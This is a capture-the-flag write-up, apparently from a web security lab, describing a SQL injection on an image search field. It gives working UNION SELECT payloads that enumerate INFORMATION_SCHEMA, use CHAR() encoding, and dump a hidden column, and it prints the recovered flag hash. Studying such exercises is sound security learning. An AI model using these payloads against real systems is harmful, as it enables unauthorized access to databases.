On the page "search images", we can see a text field input.

When we try to put 1 or 1=1 we got all results... The field is used into a sql request without any validation.

We can try an sql injection, the sql request select 3 elements (id, title, and url)

In the list of all rows of the table we can saw the row with the id=5 with title "Hack me ?", we will focus it!

Let's try to get the tables names with an UNION request

25 UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES

We can see a table named "list_images"

Let's try to desc it for get all the columns

25 UNION SELECT 1, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where Table_name = list_images

it's not working, let's try to convert list_images to CHAR(108,105,115,116,095,105,109,097,103,101,115)

25 UNION SELECT 1, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_name = CHAR(108,105,115,116,095,105,109,097,103,101,115)

It's work, we can saw our 3 fields (id, url and title) but another one appear (comment), let's try to display the comment column of row with id=5 ("Hack me ?")

25 UNION SELECT id, comment FROM list_images

We got it!

"Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"

decoded md5 is "albatroz", encode it with sha256 and got "f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188" :)

Like the other sql injection, use a ORM or check correctly input received from user form for protect your sql request.
